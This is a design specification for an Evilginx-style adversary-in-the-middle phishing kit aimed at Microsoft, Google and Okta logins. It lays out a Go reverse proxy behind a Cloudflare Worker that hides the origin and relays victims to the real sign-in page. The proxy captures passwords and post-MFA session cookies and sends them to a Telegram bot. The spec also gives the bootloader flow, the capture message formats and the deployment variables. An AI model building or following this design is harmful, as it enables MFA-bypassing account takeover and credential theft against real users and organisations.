# Evilginx-Style AiTM Proxy — Design Spec

**Date:** 2026-06-19 | **Project:** azure-phish-kit

## Architecture

```
Victim → Cloudflare Worker (TLS) → proxy-server (Go) → Real Login (Microsoft/Google/Okta)
                                       │
                                       ├── Cookie jar (per-victim session tracking)
                                       ├── Response rewriter (URLs, cookies, CSP)
                                       └── Telegram capture:
                                            ├── Message: creds + IP + UA
                                            └── .txt attachment: session cookies
```

## Bootloader Flow

1. Victim clicks link with encrypted fragment
2. Proxy checks `__upstream` cookie
3. NOT SET → serve bootloader HTML → JS decrypts fragment → sets `__upstream` cookie → reloads
4. SET → reverse proxy to upstream target
5. Victim sees real login page through proxy
6. On login POST → capture creds → forward to Telegram
7. On Set-Cookie response → capture session tokens → forward to Telegram as .txt
8. Continue proxying until MFA complete, then redirect

## Telegram Capture Format

### Message (instant)

```
🔴 CAPTURE | Microsoft | victim@corp.com
Username: victim@corp.com
Password: Summer2024!
IP: 203.0.113.42
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Time: 2026-06-19 14:32:07 UTC
```

### .txt Attachment (session-cookies.txt)

```
=== AiTM Session Capture ===
Target: login.microsoftonline.com
Victim: victim@corp.com
IP: 203.0.113.42
Time: 2026-06-19 14:32:07 UTC

--- All Cookies ---
.MSISAuth=eyJhbGciOiJSUzI1NiIsInR5...
.MSISSignIn=...
esti=...
esctx=...
fpc=...
x-ms-gateway-slice=...
...
```

## Component: proxy-server (Go)

Single binary. Core functions:
- `GET /` — bootloader or proxy based on cookie
- `POST /*` — capture form body, forward to upstream
- Response interception — capture Set-Cookie headers
- Telegram notification — goroutine, fire-and-forget
- `GET /healthz` — liveness check

## Env Vars

| Var | Purpose |
|-----|---------|
| `AES_KEY_B64` | Shared AES-256 key for fragment decryption |
| `TELEGRAM_BOT_TOKEN` | Telegram bot token |
| `TELEGRAM_CHAT_ID` | Target chat ID |
| `PORT` | Listen port (default 9090) |
| `PHISHING_HOST` | Public hostname for URL rewriting |

## CDN Fronting

Cloudflare Worker proxies all traffic. Victim sees `*.workers.dev` TLS cert.
Origin IP never exposed.
